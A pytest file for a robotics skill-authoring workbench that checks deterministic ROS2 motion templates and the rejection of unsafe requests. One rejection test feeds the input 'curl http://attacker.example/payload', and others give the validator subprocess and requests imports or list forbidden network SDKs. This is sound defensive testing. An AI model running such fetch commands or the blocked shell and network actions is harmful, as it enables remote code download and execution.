"""Phase 15A robotics skill authoring tests.

The platform is **not safety-certified**. These tests exercise the
honesty + determinism guarantees of the workbench. They never call
a real LLM API, never execute generated code, never spin up ROS,
and never write outside ``tmp_path`` (except for the committed
``skill-library/`` fixture sanity checks).
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from app.skill_authoring import (
    ACCEPTED_EXAMPLES,
    CodeCard,
    FORBIDDEN_CODE_TOKENS,
    GeneratedSkill,
    REJECTED_EXAMPLES,
    REQUIRED_CODE_TOKENS,
    SKILL_AUTHORING_DISCLAIMER,
    SKILL_CATALOG,
    SkillAuthoringRequest,
    SkillExample,
    SkillGenerationStatus,
    SkillLanguage,
    SkillRejectionReason,
    SkillRiskBand,
    SkillSafetyStatus,
    SkillType,
    accepted_example_by_id,
    build_audit_bundle,
    code_card_metadata,
    find_template,
    generate_skill,
    list_supported_skills,
    parse_request,
    rejected_example_by_id,
    review_generated_skill,
    validate_generated_skill,
    write_audit_files,
)
from app.skill_authoring.intent_parser import feet_to_meters
from app.skill_authoring.templates import supported_template_keys
from app.skill_authoring.validator import validate_generated_code
from app.verification.requirements import RequirementKind, RequirementsRegistry


REPO_ROOT = Path(__file__).resolve().parents[2]
PKG_DIR = Path(__file__).resolve().parents[1] / "app" / "skill_authoring"
SKILL_LIB = REPO_ROOT / "skill-library"
DOCS_DIR = REPO_ROOT / "docs"

PHASE_15A_DOCS: tuple[str, ...] = (
    "ROBOTICS_SKILL_AUTHORING_WORKBENCH.md",
    "SKILL_TEMPLATE_CATALOG.md",
    "SKILL_SAFETY_BOUNDARY.md",
    "CODE_CARD_METADATA.md",
    "DEFERRED_PHASES.md",
)

FIXED_TIME = "2026-05-13T00:00:00+00:00"


def _request(text: str, *, request_id: str = "p-test", language: str = "python_ros2") -> SkillAuthoringRequest:
    return SkillAuthoringRequest(
        request_id=request_id,
        text=text,
        language=language,
        requested_at_utc=FIXED_TIME,
    )


def _generate(text: str, **kwargs) -> "GeneratedSkill | None":
    result = generate_skill(_request(text, **kwargs), generated_at_utc=FIXED_TIME)
    return result.generated_skill


def _result(text: str, **kwargs):
    return generate_skill(_request(text, **kwargs), generated_at_utc=FIXED_TIME)


# ----------------------------------------------------------------------
# Requirement registry coverage
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    "req_id",
    ["REQ-SKILL-001", "REQ-SKILL-002", "REQ-SKILL-003", "REQ-SKILL-004", "REQ-SKILL-005"],
)
def test_requirement_registered(req_id: str):
    registry = RequirementsRegistry()
    assert req_id in registry
    req = registry.get(req_id)
    assert req.kind == RequirementKind.SKILL
    assert req.test_refs, f"{req_id} must list test bindings"


def test_requirement_kind_skill_exists():
    assert RequirementKind.SKILL.value == "skill"


# ----------------------------------------------------------------------
# REQ-SKILL-001 - deterministic catalog + parser
# ----------------------------------------------------------------------


def test_move_forward_6_feet_generates_bounded_python():
    skill = _generate("What code do I need to move my robot 6 feet forward?")
    assert skill is not None
    assert skill.skill_type == SkillType.MOVE_FORWARD_DISTANCE.value
    assert skill.language == SkillLanguage.PYTHON_ROS2.value
    assert "DISTANCE_M = 1.8288" in skill.code
    assert "TIMEOUT_S" in skill.code
    assert "Twist()" in skill.code


def test_move_forward_6_feet_alternate_phrasing():
    skill = _generate("Move 6 feet forward")
    assert skill is not None
    assert skill.skill_type == SkillType.MOVE_FORWARD_DISTANCE.value
    assert "DISTANCE_M = 1.8288" in skill.code


def test_feet_to_meters_helper():
    assert feet_to_meters(6.0) == 1.8288
    assert feet_to_meters(2.0) == 0.6096


def test_unsupported_request_is_unsupported():
    result = _result("Please write me a poem about robots")
    assert result.status == SkillGenerationStatus.UNSUPPORTED.value
    assert result.rejection_reason == SkillRejectionReason.UNSUPPORTED_INSTRUCTION.value
    assert result.generated_skill is None


def test_parser_rejects_unsupported_instruction():
    candidate = parse_request("compute the eigenvalues of the rover IMU bias")
    assert candidate.status == SkillGenerationStatus.UNSUPPORTED.value


def test_catalog_is_closed_set():
    keys = supported_template_keys()
    catalog_skills = list_supported_skills()
    expected = {
        SkillType.MOVE_FORWARD_DISTANCE.value,
        SkillType.ROTATE_DEGREES.value,
        SkillType.STOP_IMMEDIATELY.value,
        SkillType.PUBLISH_REQUESTED_MOTION.value,
        SkillType.KEYBOARD_FORWARD_BINDING.value,
        SkillType.CONTROLLER_BUTTON_BINDING.value,
        SkillType.WAYPOINT_REQUEST.value,
        SkillType.PATROL_ROUTE_TEMPLATE.value,
        SkillType.SAFE_STOP_WRAPPER.value,
    }
    assert set(catalog_skills) == expected
    assert {k[0] for k in keys} == expected


def test_generator_is_deterministic_for_fixed_timestamp(tmp_path: Path):
    a = _result("Move forward 2 meters")
    b = _result("Move forward 2 meters")
    assert a.status == b.status
    assert a.generated_skill is not None and b.generated_skill is not None
    assert a.generated_skill.code == b.generated_skill.code
    assert a.generated_skill.code_card.code == b.generated_skill.code_card.code


# ----------------------------------------------------------------------
# REQ-SKILL-002 - requested-motion only
# ----------------------------------------------------------------------


def test_move_forward_code_uses_requested_motion_topic():
    skill = _generate("Drive forward 2 meters")
    assert skill is not None
    assert "/cmd_vel_requested" in skill.code
    # Strip comments; executable text must not reference bare /cmd_vel.
    non_comment = "\n".join(
        line.split("#", 1)[0] for line in skill.code.splitlines()
    )
    non_comment = non_comment.replace("/cmd_vel_requested", "")
    assert "/cmd_vel" not in non_comment


def test_no_template_publishes_directly_to_cmd_vel():
    # Render every catalog template with default-shaped params and
    # confirm none publishes /cmd_vel in executable code.
    from app.skill_authoring.templates import render_template

    accepted_texts = {
        SkillType.MOVE_FORWARD_DISTANCE.value: "Drive forward 2 meters",
        SkillType.ROTATE_DEGREES.value: "Rotate left 90 degrees",
        SkillType.STOP_IMMEDIATELY.value: "Stop the robot immediately",
        SkillType.PUBLISH_REQUESTED_MOTION.value: "Publish a requested-motion command",
        SkillType.KEYBOARD_FORWARD_BINDING.value: "Bind keyboard key 'w' to move forward",
        SkillType.CONTROLLER_BUTTON_BINDING.value: "Controller button to stop",
        SkillType.WAYPOINT_REQUEST.value: "Go to waypoint alpha",
        SkillType.PATROL_ROUTE_TEMPLATE.value: "Patrol alpha beta",
        SkillType.SAFE_STOP_WRAPPER.value: "Wrap motion in safe-stop",
    }
    for skill_type, text in accepted_texts.items():
        skill = _generate(text, request_id=f"t-{skill_type}")
        assert skill is not None, f"failed to generate {skill_type}"
        non_comment = "\n".join(
            line.split("#", 1)[0] for line in skill.code.splitlines()
        )
        non_comment = non_comment.replace("/cmd_vel_requested", "")
        assert "/cmd_vel" not in non_comment, f"{skill_type} leaks /cmd_vel"


def test_validator_rejects_direct_cmd_vel_publication():
    # Inject a tampered code blob and confirm the validator rejects it.
    bad_code = """# header
import rclpy
from geometry_msgs.msg import Twist
def main():
    publisher = node.create_publisher(Twist, "/cmd_vel", 10)
"""
    diags = validate_generated_code(bad_code, SkillType.MOVE_FORWARD_DISTANCE.value)
    assert any(d.code == "direct_actuator_command" for d in diags)


def test_validator_rejects_forbidden_imports():
    bad_code = """import subprocess
import requests
from geometry_msgs.msg import Twist
# /cmd_vel_requested
"""
    diags = validate_generated_code(bad_code, SkillType.MOVE_FORWARD_DISTANCE.value)
    codes = {d.code for d in diags}
    assert "shell_or_code_execution" in codes
    assert "network_access" in codes


def test_validator_rejects_while_true_loop():
    bad_code = """# /cmd_vel_requested
while True:
    publisher.publish(Twist())
"""
    diags = validate_generated_code(bad_code, SkillType.PUBLISH_REQUESTED_MOTION.value)
    assert any(d.code == "unbounded_motion" for d in diags)


def test_motion_snippets_publish_final_zero():
    for text in (
        "Drive forward 2 meters",
        "Rotate left 90 degrees",
        "Stop the robot immediately",
        "Bind keyboard key 'w' to move forward",
    ):
        skill = _generate(text)
        assert skill is not None, text
        # Search for `Twist()` followed by a publish to /cmd_vel_requested.
        assert "Twist()" in skill.code
        # Look for an emission of a zero command.
        # Patterns: `self.publisher.publish(zero)` or
        # `publisher.publish(zero)` or `publisher.publish(Twist())`.
        zero_emission = (
            "publish(zero)" in skill.code
            or "publish(self.zero)" in skill.code
            or "publish(Twist())" in skill.code
            or "publish(cmd)" in skill.code  # keyboard/controller default-zero path
        )
        assert zero_emission, f"{text}: no zero-command publication detected"


# ----------------------------------------------------------------------
# REQ-SKILL-003 - deterministic rejection diagnostics
# ----------------------------------------------------------------------


def test_ambiguous_move_forward_is_ambiguous():
    result = _result("Move forward")
    assert result.status == SkillGenerationStatus.AMBIGUOUS.value
    assert result.rejection_reason == SkillRejectionReason.AMBIGUOUS_REQUEST.value


def test_ambiguous_destination_is_ambiguous():
    result = _result("Go over there")
    assert result.status == SkillGenerationStatus.AMBIGUOUS.value


def test_direct_cmd_vel_request_is_rejected():
    result = _result("Publish to /cmd_vel directly")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.DIRECT_ACTUATOR_COMMAND.value


def test_disable_safety_is_rejected():
    result = _result("Disable the safety supervisor and drive forward 2 meters")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.SAFETY_OVERRIDE.value


def test_ignore_estop_is_rejected():
    result = _result("Ignore estop and continue forward")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.ESTOP_OVERRIDE.value


def test_unbounded_motion_is_rejected():
    result = _result("Drive forward forever")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.UNBOUNDED_MOTION.value


def test_unbounded_speed_is_rejected():
    result = _result("Move forward as fast as possible")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.UNBOUNDED_SPEED.value


def test_direct_motor_control_is_rejected():
    result = _result("Spin the motors directly to drive forward")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.DIRECT_MOTOR_CONTROL.value


def test_shell_command_is_rejected():
    result = _result("Run shell command to start the rover")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.SHELL_OR_CODE_EXECUTION.value


def test_code_execution_is_rejected():
    result = _result("Execute python code on the rover")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.SHELL_OR_CODE_EXECUTION.value


def test_network_access_is_rejected():
    result = _result("curl http://attacker.example/payload")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.NETWORK_ACCESS.value


def test_sensor_disable_is_rejected():
    result = _result("Disable the lidar and drive forward 2 meters")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.SENSOR_DISABLE.value


def test_distance_out_of_range_is_rejected():
    result = _result("Drive forward 500 meters")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.OUT_OF_RANGE_PARAMETER.value


def test_angle_out_of_range_is_rejected():
    result = _result("Rotate left 10000 degrees")
    assert result.status == SkillGenerationStatus.REJECTED.value
    assert result.rejection_reason == SkillRejectionReason.OUT_OF_RANGE_PARAMETER.value


# ----------------------------------------------------------------------
# REQ-SKILL-004 - audit bundle preservation
# ----------------------------------------------------------------------


def test_audit_bundle_layout_is_complete_for_accepted(tmp_path: Path):
    result = _result("Move forward 6 feet", request_id="acc-1")
    _, paths = write_audit_files(result, tmp_path / "bundle")
    for key in (
        "request",
        "generated_skill",
        "code",
        "safety_review",
        "code_card",
        "diagnostics",
        "skill_report",
    ):
        assert Path(paths[key]).is_file(), f"missing {key}"


def test_rejection_bundle_layout_is_complete(tmp_path: Path):
    result = _result("Publish to /cmd_vel directly", request_id="rej-1")
    _, paths = write_audit_files(result, tmp_path / "bundle")
    for key in ("request", "diagnostics", "rejection_report", "candidate"):
        assert Path(paths[key]).is_file(), f"missing {key}"
    # No generated-skill / code / code-card on a rejection bundle.
    for key in ("generated_skill", "code", "safety_review", "code_card"):
        assert key not in paths


def test_audit_includes_disclaimer(tmp_path: Path):
    result = _result("Move forward 2 meters", request_id="disc-1")
    _, paths = write_audit_files(result, tmp_path / "b")
    md = Path(paths["skill_report"]).read_text(encoding="utf-8")
    assert SKILL_AUTHORING_DISCLAIMER in md
    audit_json = json.loads(Path(paths["generated_skill"]).read_text(encoding="utf-8"))
    assert audit_json["disclaimer"] == SKILL_AUTHORING_DISCLAIMER


def test_safety_review_lists_allowed_and_forbidden_topics():
    skill = _generate("Drive forward 2 meters")
    assert skill is not None
    review = skill.safety_review
    assert review is not None
    assert "/cmd_vel_requested" in review.allowed_topics
    assert "/cmd_vel" in review.forbidden_topics


def test_safety_review_blocked_on_validation_failure(tmp_path: Path):
    # Force a validation failure by hand-constructing a skill with
    # bad code, then re-reviewing.
    skill = _generate("Drive forward 2 meters")
    assert skill is not None
    bad = GeneratedSkill(
        skill_id=skill.skill_id,
        skill_type=skill.skill_type,
        language=skill.language,
        title=skill.title,
        subtitle=skill.subtitle,
        code="# tampered\nimport subprocess\n",
        parameters=skill.parameters,
        diagnostics=skill.diagnostics,
        code_card=skill.code_card,
        safety_review=skill.safety_review,
        generated_at_utc=skill.generated_at_utc,
        request_text=skill.request_text,
        normalised_text=skill.normalised_text,
        disclaimer=skill.disclaimer,
    )
    review = review_generated_skill(bad)
    assert review.safety_status == SkillSafetyStatus.UNSAFE_REJECTED.value
    assert review.risk_band == SkillRiskBand.BLOCKED.value


# ----------------------------------------------------------------------
# REQ-SKILL-005 - code-card metadata
# ----------------------------------------------------------------------


def test_code_card_metadata_present_on_accepted_skill():
    skill = _generate("Drive forward 2 meters")
    assert skill is not None
    card = skill.code_card
    assert isinstance(card, CodeCard)
    assert card.skill_type == SkillType.MOVE_FORWARD_DISTANCE.value
    assert card.language == SkillLanguage.PYTHON_ROS2.value
    assert card.line_count > 10
    assert "requested-motion-only" in card.safety_badges
    assert "supervisor-authorised" in card.safety_badges
    assert "not-safety-certified" in card.safety_badges


def test_code_card_animation_steps_for_move_forward():
    skill = _generate("Drive forward 2 meters")
    assert skill is not None
    steps = skill.code_card.animation_steps
    for required in (
        "imports",
        "constants",
        "publisher setup",
        "bounded command loop",
        "stop command",
        "safety explanation",
    ):
        assert required in steps


def test_code_card_animation_steps_for_stop():
    skill = _generate("Stop the robot immediately")
    assert skill is not None
    assert skill.code_card.animation_steps == (
        "imports",
        "publisher setup",
        "stop command",
        "safety explanation",
    )


def test_code_card_payload_serialises_to_json():
    skill = _generate("Drive forward 2 meters")
    assert skill is not None
    from app.skill_authoring.audit import generated_skill_to_dict

    payload = generated_skill_to_dict(skill)
    encoded = json.dumps(payload, sort_keys=True)
    assert "/cmd_vel_requested" in encoded


def test_skill_layer_has_no_frontend_imports():
    forbidden_tokens = (
        "import flask",
        "import fastapi",
        "import django",
        "import streamlit",
        "import dash",
        "import react",
        "import jsx",
        "import vue",
        "from flask",
        "from fastapi",
        "from django",
        "from streamlit",
    )
    for path in PKG_DIR.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        for token in forbidden_tokens:
            assert token not in text, f"{path.name} contains forbidden frontend token {token!r}"


# ----------------------------------------------------------------------
# Package-level honesty rules
# ----------------------------------------------------------------------


_IMPORT_LINE_RE = re.compile(
    r"^\s*(?:import|from)\s+([a-zA-Z0-9_.]+)", re.MULTILINE
)


def _imports_in(text: str) -> set[str]:
    # Return the set of top-level imports performed by the file.
    # AST-level scan; string literals (e.g. the template source code
    # that embeds ``import rclpy`` as part of a generated snippet) are
    # ignored.
    import ast

    out: set[str] = set()
    try:
        tree = ast.parse(text)
    except SyntaxError:
        return out
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                out.add(alias.name.split(".")[0])
        elif isinstance(node, ast.ImportFrom) and node.module:
            out.add(node.module.split(".")[0])
    return out


def test_skill_layer_has_no_llm_sdk_imports():
    forbidden = {
        "anthropic",
        "openai",
        "cohere",
        "vertexai",
        "replicate",
        "ollama",
        "llama_cpp",
        "httpx",
        "requests",
    }
    for path in PKG_DIR.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        imports = _imports_in(text)
        intersect = imports & forbidden
        assert not intersect, f"{path.name} imports forbidden LLM/network SDK: {intersect}"


def test_skill_layer_has_no_rclpy_imports():
    """The library does not import rclpy. Generated *snippets* do, but
    that text lives inside string literals and is not detected by the
    AST-level import scan below."""

    for path in PKG_DIR.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        imports = _imports_in(text)
        assert "rclpy" not in imports, f"{path.name} imports rclpy"


def test_validate_generated_skill_on_clean_skill_returns_empty():
    skill = _generate("Drive forward 2 meters")
    assert skill is not None
    assert validate_generated_skill(skill) == ()


# ----------------------------------------------------------------------
# Committed examples on disk
# ----------------------------------------------------------------------


@pytest.mark.parametrize("ex", ACCEPTED_EXAMPLES, ids=[e.example_id for e in ACCEPTED_EXAMPLES])
def test_accepted_example_generates(ex: SkillExample):
    result = _result(ex.text, request_id=ex.example_id, language=ex.language)
    assert result.status == SkillGenerationStatus.GENERATED.value
    assert result.generated_skill is not None


@pytest.mark.parametrize("ex", REJECTED_EXAMPLES, ids=[e.example_id for e in REJECTED_EXAMPLES])
def test_rejected_example_matches_expected_status(ex: SkillExample):
    result = _result(ex.text, request_id=ex.example_id, language=ex.language)
    assert result.status == ex.expected_status, (
        f"{ex.example_id}: expected {ex.expected_status}, got {result.status}"
    )


def test_committed_accepted_bundle_present():
    bundle = SKILL_LIB / "audits" / "move_forward_6_feet"
    assert bundle.is_dir(), bundle
    for name in (
        "request.json",
        "generated-skill.json",
        "code.py",
        "safety-review.json",
        "code-card.json",
        "diagnostics.json",
        "skill-report.md",
    ):
        assert (bundle / name).is_file(), f"missing {bundle / name}"


def test_committed_accepted_code_uses_requested_motion_topic():
    code = (SKILL_LIB / "audits" / "move_forward_6_feet" / "code.py").read_text(
        encoding="utf-8"
    )
    assert "/cmd_vel_requested" in code
    non_comment = "\n".join(line.split("#", 1)[0] for line in code.splitlines())
    non_comment = non_comment.replace("/cmd_vel_requested", "")
    assert "/cmd_vel" not in non_comment


def test_committed_rejection_bundles_have_no_generated_skill():
    for example in REJECTED_EXAMPLES:
        bundle = SKILL_LIB / "rejected" / example.example_id
        assert bundle.is_dir(), bundle
        for name in ("request.json", "diagnostics.json", "rejection-report.md", "candidate.json"):
            assert (bundle / name).is_file(), f"missing {bundle / name}"
        # No generated-skill.json on rejection bundles.
        assert not (bundle / "generated-skill.json").exists()


def test_committed_example_files_present():
    for ex in ACCEPTED_EXAMPLES:
        path = SKILL_LIB / "examples" / f"{ex.example_id}.json"
        assert path.is_file(), path
        payload = json.loads(path.read_text(encoding="utf-8"))
        assert payload["expected_status"] == ex.expected_status


# ----------------------------------------------------------------------
# Documentation
# ----------------------------------------------------------------------


@pytest.mark.parametrize("doc", PHASE_15A_DOCS)
def test_phase_15a_doc_includes_not_safety_certified_disclaimer(doc: str):
    text = (DOCS_DIR / doc).read_text(encoding="utf-8")
    assert "not safety-certified" in text.lower()


def test_safety_boundary_doc_lists_forbidden_paths():
    text = (DOCS_DIR / "SKILL_SAFETY_BOUNDARY.md").read_text(encoding="utf-8")
    for token in (
        "/cmd_vel",
        "safety supervisor",
        "e-stop",
        "lidar",
        "shell",
        "no LLM SDK imports",
    ):
        assert token in text, f"SKILL_SAFETY_BOUNDARY.md missing {token!r}"


def test_template_catalog_lists_every_skill_type():
    text = (DOCS_DIR / "SKILL_TEMPLATE_CATALOG.md").read_text(encoding="utf-8")
    for skill_type in (
        SkillType.MOVE_FORWARD_DISTANCE.value,
        SkillType.ROTATE_DEGREES.value,
        SkillType.STOP_IMMEDIATELY.value,
        SkillType.PUBLISH_REQUESTED_MOTION.value,
        SkillType.KEYBOARD_FORWARD_BINDING.value,
        SkillType.CONTROLLER_BUTTON_BINDING.value,
        SkillType.WAYPOINT_REQUEST.value,
        SkillType.PATROL_ROUTE_TEMPLATE.value,
        SkillType.SAFE_STOP_WRAPPER.value,
    ):
        assert skill_type in text, f"catalog doc missing {skill_type}"


# ----------------------------------------------------------------------
# Misc determinism
# ----------------------------------------------------------------------


def test_audit_json_is_stable_across_runs(tmp_path: Path):
    a = tmp_path / "a"
    b = tmp_path / "b"
    write_audit_files(_result("Drive forward 2 meters"), a)
    write_audit_files(_result("Drive forward 2 meters"), b)
    assert (a / "generated-skill.json").read_text(encoding="utf-8") == (
        b / "generated-skill.json"
    ).read_text(encoding="utf-8")
    assert (a / "code-card.json").read_text(encoding="utf-8") == (
        b / "code-card.json"
    ).read_text(encoding="utf-8")


def test_validate_intent_request_rejects_empty():
    from app.skill_authoring.validator import validate_intent_request

    result = validate_intent_request(
        SkillAuthoringRequest(request_id="x", text="", language="python_ros2")
    )
    assert any(d.code == "ambiguous_request" for d in result)


def test_validate_intent_request_rejects_unsupported_language():
    from app.skill_authoring.validator import validate_intent_request

    result = validate_intent_request(
        SkillAuthoringRequest(request_id="x", text="hi", language="rust")
    )
    assert any(d.code == "unsupported_instruction" for d in result)


def test_forbidden_code_tokens_list_is_nonempty():
    assert len(FORBIDDEN_CODE_TOKENS) >= 10
    for entry in FORBIDDEN_CODE_TOKENS:
        assert len(entry) == 3


def test_required_code_tokens_covers_every_skill_type():
    for st in SkillType:
        assert st.value in REQUIRED_CODE_TOKENS, st.value


def test_accepted_example_by_id_lookup():
    ex = accepted_example_by_id("move_forward_6_feet")
    assert ex.expected_status == "generated"
    with pytest.raises(KeyError):
        accepted_example_by_id("nope")


def test_rejected_example_by_id_lookup():
    ex = rejected_example_by_id("publish_direct_cmd_vel")
    assert ex.expected_status == "rejected"
